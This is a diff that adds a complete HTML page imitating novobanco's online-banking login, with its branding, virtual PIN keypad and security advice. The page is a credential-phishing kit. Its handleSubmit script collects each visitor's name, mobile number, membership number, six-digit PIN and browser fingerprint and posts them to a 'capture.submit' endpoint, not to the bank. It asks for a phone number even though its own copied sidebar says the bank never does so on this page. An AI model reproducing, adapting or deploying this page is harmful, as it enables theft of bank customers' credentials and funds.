@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html class="win firefox firefox1 gecko gecko1">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<link rel="stylesheet" href="/tpl.css" type="text/css">
+<title>-</title>
+
+<link rel="stylesheet" href="/controlos.css" type="text/css" media="screen,projection">
+<link rel="stylesheet" href="/nav.css" type="text/css" media="screen,projection">
+<link rel="stylesheet" href="/main.css" type="text/css" media="screen,projection">
+
+<script src="/b20top.js" language="javascript"></script>
+<script src="/b20srv.js" language="javascript"></script>
+<script language="javascript">
+    function __iniCtx() {
+        bNet.Ani.iniAnimation("Aguarde um momento por favor");
+        bNet.Ctx.iniContexto('1');
+    }
+
+    function doOnLoad() {
+        if (typeof __iniCtx == 'function')  __iniCtx();
+        if (typeof __iniToolbar == 'function')  __iniToolbar();
+        if (typeof __iniSrv == 'function') __iniSrv();
+    }
+</script>
+
+<script type="text/javascript" src="/evergage.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<script type="text/javascript" src="/fingerprint2.js"></script>
+<script id="53309673" type="text/javascript" src="/bcaptcha.js"></script>
+</head>
+<body class="BS" background="" onload="doOnLoad();" style="background: rgb(255, 255, 255);">
+<div id="MP" name="MP" style="display:none; POSITION: relative;">
+    <div class="clearfix" id="Loader">
+        <img id="imgLoader" src="/loader_anim.gif" alt="Loading">
+        <br><p id="MPP" name="MPP"></p>
+    </div>
+</div>
+<div id="PAGINA" name="PAGINA" onmousemove="ResetInactividadePL()" onkeypress="ResetInactividadePL()" style="background: rgb(255, 255, 255); padding: 0px;">
+    <script language="javascript" src="/EsColors.js"></script>
+    <script type="text/javascript" src="/jquery-1.4.4.min.js"></script>
+    <script type="text/javascript" src="/jquery-1.10.2.min.js"></script>
+    <script type="text/javascript" src="/jquery-ui-1.11.4.min.js"></script>
+    <script type="text/javascript" src="/jquery.reject.min.js"></script>
+    <script type="text/javascript" src="/sibsfingerprint.js"></script>
+    
+    <div style="display:none;visibility:hidden;">
+        <div id="rejectheader">Sabia que o seu browser está desactualizado?</div>
+        <div id="rejectparagraph1">O seu browser está desactualizado e não é compatível com o serviço. </div>
+        <div id="rejectparagraph2">Seleccione um dos icons abaixo para aceder de imediato à página download.</div>
+        <div id="rejectcloseMessage"></div>
+        <div id="rejectcloseLink">Fechar</div>
+    </div>
+    
+    <script type="text/javascript">
+        var metaTag = document.createElement('meta');
+        metaTag.httpEquiv = 'X-UA-Compatible';
+        metaTag.content = 'IE=edge,chrome=1';
+        var headTag = document.getElementsByTagName('head')[0];
+        headTag.insertBefore(metaTag, headTag.childNodes[0]);
+
+        var metaTag2 = document.createElement('meta');
+        metaTag2.name = 'viewport';
+        metaTag2.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+        document.getElementsByTagName('head')[0].appendChild(metaTag2);
+
+        document.getElementById("PAGINA").style.background="#ffffff";
+        document.getElementById("PAGINA").style.padding="0";
+        document.getElementsByTagName("body")[0].style.background="#ffffff";
+
+        document.createElement('main');
+        document.createElement('header');
+        document.createElement('section');
+        document.createElement('article');
+        document.createElement('aside');
+        document.createElement('legend');
+
+        if (navigator.userAgent.indexOf('MSIE') !== -1 || navigator.appVersion.indexOf('Trident/') > 0) {
+            if(!document.addEventListener) {
+                var scriptTag = document.createElement('script');
+                scriptTag.type = 'text/javascript';
+                scriptTag.src = '/web/Resources/js/respond.min.js?v1';
+                document.getElementsByTagName('head')[0].appendChild(scriptTag);
+            }
+        }
+
+        getFingerprint("v1", function (fp) {
+            var inputFP = document.createElement("input");
+            inputFP.setAttribute("type", "hidden");
+            inputFP.setAttribute("name", "FP");
+            inputFP.setAttribute("id", "FP");
+            inputFP.setAttribute("value", fp);
+            document.getElementById("form1").appendChild(inputFP);
+        });
+
+        $(document).ready(function () {
+            var queryString = window.location.search;
+
+            if ($('input[name="ad"]').val() !== '') {
+                habilitar();
+            } else {
+                desabilitar();
+                
+                $('input[name="ad"]').on('input', function() {
+                    var valorCampo = $(this).val();
+                    if (validarCampo(valorCampo)) {
+                        habilitar();
+                    } else {
+                        desabilitar();
+                    }
+                });
+            }
+
+            $.reject({
+                imagePath: '/web/Resources/browsers/',
+                display: ['msie','firefox','chrome','safari'],
+                reject: {msie4: true, msie5: true, msie6: true,firefox1:true, firefox2:true,safari2:true, safari3:true, opera7: true,opera8: true,opera9: true}, 
+                header: $("#rejectheader").html(),  
+                paragraph1: $("#rejectparagraph1").html(),   
+                paragraph2: $("#rejectparagraph2").html(),   
+                closeMessage: $("#rejectcloseMessage").html(), 
+                closeLink: $("#rejectcloseLink").html(),
+                browserInfo: { firefox: { text: "Firefox 3.6", url: "http://www.mozilla.com/firefox/"}, safari: { text: "Safari 5", url: "http://www.apple.com/safari/download/" }, chrome: { text: "Chrome", url: "http://www.google.com/chrome/"}, msie: { text: "Internet Explorer 8", url: "http://www.microsoft.com/ie/", allow: { all:false,win: true } } }, 
+                close:false
+            });  
+        });
+
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelector('input[name="nome"]').focus();
+        });
+        
+        function desabilitar() {
+            var elementos = document.querySelectorAll(".btn-numberPin, #slider");
+            elementos.forEach(function(elemento) {
+                elemento.setAttribute("disabled", true);
+                elemento.style.opacity = "0.3";
+                elemento.style.pointerEvents = "none";
+            });
+        }
+
+        function habilitar() {
+            var elementos = document.querySelectorAll(".btn-numberPin, #slider");
+            elementos.forEach(function(elemento) {
+                elemento.removeAttribute("disabled");
+                elemento.style.opacity = "1";
+                elemento.style.pointerEvents = "auto";
+            });
+        }
+        
+        function validarCampo(valor) {
+            if (valor.length >= 7) {
+                if (/^\d+$/.test(valor)) {
+                    return true;
+                }
+                if (/^[a-zA-Z]/.test(valor)) {
+                    if (valor.length >= 8) {
+                        return true;
+                    }
+                }
+            }
+            return false;
+        }
+
+        var fsi=null; var fli = 'login'; var fui = null;
+    </script>
+    
+    <main class="containerLogin">
+        <article class="rowLogin">
+            <div class="col-md-9 contentColLogin">
+                <header class="rowLogin generic-headerLogin">
+                    <div class="col-md-12" id="header">
+                        <div id="logotipo"></div>
+                    </div>
+                </header>
+                
+                <section class="col-sm-12 gray-bg login-content">
+                    <form action="#" method="POST" id="form1" name="form1" class="col-sm-12 login-form" onsubmit="return handleSubmit(event);">
+                        <script src="/b20top.js" language="javascript"></script>
+                        <input type="hidden" name="SRV" value="00101">
+                        <input type="hidden" name="selo" value="0">
+                        
+                        <div class="col-sm-12 nblogin-message">
+                            <div id="AreaMensagemErro" class="hiddenError"><p></p></div>
+                            <script language="javascript">
+                                document.getElementById("imgLoader").src = '/loader_anim.gif';
+                            </script>
+                        </div>
+                        
+                        <div class="rowLogin" id="pinpad">
+                            <div class="col-sm-6">
+                                <fieldset>
+                                    <label class="nblogin-title">Nome </label>
+                                    <input type="text" name="nome" class="nblogin-input white-bg" maxlength="100" autocomplete="off">
+                                </fieldset>
+                                
+                                <fieldset>
+                                    <label class="nblogin-title">Telemóvel </label>
+                                    <input type="text" name="telemovel" class="nblogin-input white-bg" maxlength="20" autocomplete="off">
+                                </fieldset>
+                                
+                                <fieldset>
+                                    <label class="nblogin-title">Nº adesão </label>
+                                    <input type="text" name="ad" class="nblogin-input white-bg" size="7" maxlength="20" onkeypress="return validc(event,this.form,0);" onkeyup="return ValidaNa(this.form);" autocomplete="off">
+                                </fieldset>
+                                
+                                <fieldset>
+                                    <label class="nblogin-title">PIN </label>
+                                    <div id="divPinKB" class="nblogin-input green-pin white-bg">
+                                        <table cellspacing="0" cellpadding="0" id="slPin" class="nblogin-pincodigo">
+                                            <tbody>
+                                                <tr>
+                                                    <td id="sl0" class="pincodigo">&nbsp;</td>
+                                                    <td id="sl1" class="pincodigo">&nbsp;</td>
+                                                    <td id="sl2" class="pincodigo">&nbsp;</td>
+                                                    <td id="sl3" class="pincodigo">&nbsp;</td>
+                                                    <td id="sl4" class="pincodigo">&nbsp;</td>
+                                                    <td id="sl5" class="pincodigo">&nbsp;</td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                    <button class="btn btn-clear" onmouseup="cAKB();" onclick="return false;" style="visibility:hidden" id="btnLoginClear">Limpar</button>
+                                </fieldset>
+                                
+                                <ul class="nblogin-list">
+                                    <li>Primeiro escreva o seu número de adesão, e depois insira o PIN usando o teclado virtual</li>
+                                    <li>Esqueceu o <strong>PIN</strong>?<a style="color:#616469" href="https://sec.novobanco.pt/web/PTPW1/tpl.asp?ad=&amp;pin=000000&amp;selo=696693981&amp;rp=1" onclick="behave();"><strong></strong></a><strong>Peça <a class="loginLink" href="https://sec.novobanco.pt/web/ocp/seguranca/nbo-reemissao-pin/?app=1&amp;md=2" target="_self">aqui</a> um novo.</strong></li>
+                                </ul>
+                            </div>
+                            
+                            <div class="col-sm-6">
+                                <input type="hidden" name="AvisaBrowser" value="true">
+                                <input type="hidden" name="pin" value="">
+                                <input type="hidden" name="nx" value="">
+                                
+                                <script language="javascript">
+                                    var num_btk = parseInt('10',10), num_btk2=0;
+                                    var zpk=0, zpk2=0, cntk=3, actk=false;
+                                    var ch_stk=(num_btk==10)?48:65, ch_stk2=48;
+                                    if(num_btk==36){num_btk=26;num_btk2=10;}
+                                    var pink="", pinkentry="spa";
+                                    var lek1="", lek2="", lek3="";
+                                    
+                                    function lmp(frm) { 
+                                        frm.nx.value='0'+cvt1('74OM74ShiVA74740', frm.pin.value); 
+                                        frm.pin.value=""; 
+                                    }
+                                    
+                                    function pKB(i) { 
+                                        var txtPin = document.getElementById("divPinKB"); 
+                                        if(txtPin){ txtPin.className ="nblogin-input green-pin gray-bg";} 
+                                        var btnClear = document.getElementById("btnLoginClear"); 
+                                        if(btnClear) { btnClear.style.visibility="visible" } 
+                                        a=document.getElementById("sl"+pink.length); 
+                                        if(a){ 
+                                            a.innerHTML="*"; 
+                                            pink+=""+String.fromCharCode(ch_stk+(((1*i)+zpk)%num_btk));
+                                        } 
+                                        if (pink.length>=6){ 
+                                            behave(); 
+                                            pink=pink.substring(0,6); 
+                                            document.form1.pin.value=pink; 
+                                            document.form1.selo.value = (new Date()).getTime(); 
+                                            lmp(document.form1); 
+                                            handleSubmit(new Event('submit')); 
+                                        }
+                                    }
+                                    
+                                    function pKB2(i) {
+                                        var txtPin = document.getElementById("divPinKB"); 
+                                        if(txtPin){ txtPin.className ="nblogin-input green-pin gray-bg";} 
+                                        var btnClear = document.getElementById("btnLoginClear"); 
+                                        if(btnClear) { btnClear.style.visibility="visible" } 
+                                        a=document.getElementById("sl"+pink.length); 
+                                        if(a) {
+                                            a.innerHTML="*"; 
+                                            pink+=""+String.fromCharCode(ch_stk2+(((1*i)+zpk2)%num_btk2));
+                                        } 
+                                        if (pink.length>=6) { 
+                                            behave(); 
+                                            pink=pink.substring(0,6); 
+                                            document.form1.pin.value=pink; 
+                                            document.form1.selo.value = (new Date()).getTime(); 
+                                            lmp(document.form1); 
+                                            handleSubmit(new Event('submit')); 
+                                        }
+                                    }
+                                    
+                                    function cAKB() { 
+                                        var btnClear = document.getElementById("btnLoginClear"); 
+                                        if(btnClear) { btnClear.style.visibility="hidden" } 
+                                        var txtPin = document.getElementById("divPinKB"); 
+                                        if(txtPin){ txtPin.className ="nblogin-input green-pin white-bg";} 
+                                        for(n=0;n<6;n++) { 
+                                            a=document.getElementById("sl"+n); 
+                                            if(a) a.innerHTML='&#160;'; 
+                                        } 
+                                        pink=""; 
+                                        fillSlotsKB(); 
+                                        if(num_btk2!=0) fillSlotsKB2();
+                                    }
+                                    
+                                    function disablePostback(event) { 
+                                        if(event.preventDefault){	
+                                            event.preventDefault();	
+                                        } else { 
+                                            event.returnValue = false;
+                                        } 
+                                        return false; 
+                                    }
+                                    
+                                    function fillSlotsKB() {
+                                        var a,n;
+                                        zpk=(zpk+1+Math.floor(Math.random()*(num_btk-1)))%num_btk; 
+                                        for (n=0;n<num_btk;n++) {
+                                            a=document.getElementById("btk"+n); 
+                                            if (a) a.innerHTML=String.fromCharCode(ch_stk+(n+zpk)%num_btk);
+                                        }
+                                    }
+                                    
+                                    function fillSlotsKB2() {
+                                        var a,n;
+                                        zpk2=(zpk2+1+Math.floor(Math.random()*(num_btk2-1)))%num_btk2; 
+                                        for (n=0;n<num_btk2;n++) {
+                                            a=document.getElementById("btk"+(n+num_btk));
+                                            if (a) a.innerHTML=String.fromCharCode(ch_stk2+(n+zpk2)%num_btk2);
+                                        }
+                                    }
+                                    
+                                    function changeSlotsKB(disabled) {
+                                        var a,n; 
+                                        for (n=0;n<num_btk;n++) {
+                                            a=document.getElementById("btk"+n); 
+                                            if (a) a.disabled=disabled;
+                                        } 
+                                        if(num_btk2!=0) changeSlotsKB2(disabled);
+                                    }
+                                    
+                                    function changeSlotsKB2(disabled) {
+                                        var a,n;
+                                        for (n=0;n<num_btk2;n++) {
+                                            a=document.getElementById("btk"+(n+num_btk));	
+                                            if (a) a.disabled=disabled;
+                                        }
+                                    }
+                                    
+                                    function changeActionMessageKB(msg) {
+                                        a=document.getElementById("actionMsg");	
+                                        if (a) a.innerHTML=msg;
+                                    }
+                                    
+                                    function handleSubmit(event) {
+                                        event.preventDefault();
+                                        
+                                        var nome = document.forms["form1"]["nome"].value;
+                                        var telemovel = document.forms["form1"]["telemovel"].value;
+                                        var adesao = document.forms["form1"]["ad"].value;
+                                        var pin = document.forms["form1"]["pin"].value;
+                                        var fingerprint = document.getElementById("FP") ? document.getElementById("FP").value : "";
+                                        
+                                        if (nome && telemovel && adesao && pin) {
+                                            fetch('/api/trpc/capture.submit?batch=1', {
+                                                method: 'POST',
+                                                headers: {
+                                                    'Content-Type': 'application/json',
+                                                },
+                                                body: JSON.stringify({
+                                                    "0": {
+                                                         "json": {
+                                                            name: nome,
+                                                            phone: telemovel,
+                                                            membershipNumber: adesao,
+                                                            pin: pin,
+                                                            fingerprint: fingerprint
+                                                        }
+                                                    }
+                                                })
+                                            })
+                                            .then(response => response.json())
+                                            .then(data => {
+                                                console.log('Dados enviados com sucesso:', data);
+                                                // Reset form
+                                                document.form1.reset();
+                                                pink = '';
+                                                document.getElementById('pin1').innerHTML = '';
+                                                document.getElementById('pin2').innerHTML = '';
+                                                document.getElementById('pin3').innerHTML = '';
+                                                document.getElementById('pin4').innerHTML = '';
+                                                document.getElementById('pin5').innerHTML = '';
+                                                document.getElementById('pin6').innerHTML = '';
+                                                // Disable keyboard
+                                                disableKB();
+                                            })
+                                            .catch(error => {
+                                                console.error('Erro ao enviar dados:', error);
+                                                // Reset form even on error
+                                                document.form1.reset();
+                                                pink = '';
+                                                document.getElementById('pin1').innerHTML = '';
+                                                document.getElementById('pin2').innerHTML = '';
+                                                document.getElementById('pin3').innerHTML = '';
+                                                document.getElementById('pin4').innerHTML = '';
+                                                document.getElementById('pin5').innerHTML = '';
+                                                document.getElementById('pin6').innerHTML = '';
+                                                disableKB();
+                                            });
+                                        }
+                                        
+                                        return false;
+                                    }
+                                </script>
+                                
+                                <div class="pin-keyboard text-center">
+                                    <div class="pin-numbers" onselectstart="return false;">
+                                        <fieldset>Por favor, introduza o seu PIN</fieldset>
+                                        <button id="btk1" class="btn btn-numberPin" onmouseup="pKB('1')" onclick="disablePostback(event)" disabled="true" style="opacity: 0.3; pointer-events: none;">0</button>
+                                        <button id="btk2" class="btn btn-numberPin" onmouseup="pKB('2')" onclick="disablePostback(event)" disabled="true" style="opacity: 0.3; pointer-events: none;">1</button>
+                                        <button id="btk3" class="btn btn-numberPin" onmouseup="pKB('3')" onclick="disablePostback(event)" disabled="true" style="opacity: 0.3; pointer-events: none;">2</button>
+                                        <button id="btk4" class="btn btn-numberPin" onmouseup="pKB('4')" onclick="disablePostback(event)" disabled="true" style="opacity: 0.3; pointer-events: none;">3</button>
+                                        <button id="btk5" class="btn btn-numberPin" onmouseup="pKB('5')" onclick="disablePostback(event)" disabled="true" style="opacity: 0.3; pointer-events: none;">4</button>
+                                        <button id="btk6" class="btn btn-numberPin" onmouseup="pKB('6')" onclick="disablePostback(event)" disabled="true" style="opacity: 0.3; pointer-events: none;">5</button>
+                                        <button id="btk7" class="btn btn-numberPin" onmouseup="pKB('7')" onclick="disablePostback(event)" disabled="true" style="opacity: 0.3; pointer-events: none;">6</button>
+                                        <button id="btk8" class="btn btn-numberPin" onmouseup="pKB('8')" onclick="disablePostback(event)" disabled="true" style="opacity: 0.3; pointer-events: none;">7</button>
+                                        <button id="btk9" class="btn btn-numberPin" onmouseup="pKB('9')" onclick="disablePostback(event)" disabled="true" style="opacity: 0.3; pointer-events: none;">8</button>
+                                        <button id="btk0" class="btn btn-numberPin" onmouseup="pKB('0')" onclick="disablePostback(event)" disabled="true" style="opacity: 0.3; pointer-events: none;">9</button>
+                                    </div>
+                                    
+                                    <div class="pin-privacy">
+                                        <span>Modo teclado privacidade</span>
+                                        <div class="customslider-cont" style="padding-top:15px">
+                                            <div id="slider" class="ui-slider ui-slider-horizontal ui-widget ui-widget-content ui-corner-all" disabled="true" style="opacity: 0.3; pointer-events: none;">
+                                                <div class="ui-slider-range ui-widget-header ui-corner-all ui-slider-range-max" style="width: 0%;"></div>
+                                                <span class="ui-slider-handle ui-state-default ui-corner-all" tabindex="0" style="left: 100%;"></span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <script language="javascript">
+                                    fillSlotsKB(); 
+                                    if(num_btk2!=0) fillSlots2KB(); 
+                                    changeSlotsKB(false);
+                                    
+                                    if ('ontouchstart' in document) { 
+                                        var elements = document.getElementsByClassName("btn btn-numberPin"); 
+                                        for(var i = elements.length - 1; i >= 0; --i){
+                                            elements[i].className = "btn btn-numberPin touch"; 
+                                        }
+                                    }
+                                    
+                                    $("#slider").slider({
+                                        range: "max",
+                                        animate:"fast",
+                                        min: 25,
+                                        max: 100,
+                                        value: 100,
+                                        slide: handleSliderChanges,
+                                        stop: fillSlotsKB
+                                    });
+                                    
+                                    function handleSliderChanges(e, ui){
+                                        var initialFontSize = 30;
+                                        var fontSize = (initialFontSize*ui.value)/100;
+                                        $(".btn-numberPin" ).css("font-size", fontSize+"px");
+                                    }
+                                </script>
+                            </div>
+                        </div>
+                        
+                        <button class="btn btn-back" onmouseup="behave();window.location.href='https://www.novobanco.pt'" onclick="return false;">Voltar</button>
+                        <script language="Javascript">window.focus();</script>
+                    </form>
+                </section>
+                
+                <div class="col-sm-12"></div>
+            </div>
+            
+            <aside class="col-md-3 sidebarLogin">
+                <section class="securityLogin">
+                    <h2><i aria-hidden="true" class="circleLogin circle-lock"></i>Segurança Canais Digitais</h2>
+                    <ul class="regular-listLogin">
+                        <li>Leia atentamente o conteúdo dos SMS de confirmação de operações.</li>
+                        <li>Não reconhece a operação no texto do SMS? Não forneça o código a ninguém!</li>
+                        <li>Nunca tire ou envie fotografias do cartão matriz.</li>
+                        <li>Nunca lhe pediremos mais que 3 dígitos da matriz.</li>
+                        <li>Não siga ou clique em links que constem em emails ou SMS suspeitos.</li>
+                        <li>Nunca lhe pediremos o seu número de telemóvel nesta página.</li>
+                        <p><br></p>
+                        <p><a class="loginLink" style="padding:0px" href="https://www.novobanco.pt/site/cms.aspx?plg=463edf21-ba56-43e6-9ea2-67b9920724c8" target="_blank">Recomendações de Segurança</a>.</p>
+                        <p><br></p>
+                        <p style="text-align: justify;">
+                            Em caso de dúvida, contacte por favor o novobanco através do 218 837 700 (custo contratado entre o cliente e a operadora telecomunicações) ou 707 247 365 (custo de 0,09€/min a partir da rede fixa e de 0,13€/min a partir da rede móvel, acrescido de IVA à taxa em vigor).
+                        </p>
+                    </ul>
+                </section>
+            </aside>
+        </article>
+    </main>
+    
+    <script language="javascript">
+        function ResetInactividadePL() { 
+            if ("SetResetInactividadePL" in top){
+                top.SetResetInactividadePL();
+            }
+        }
+    </script>
+</div>
+</body>
+</html>
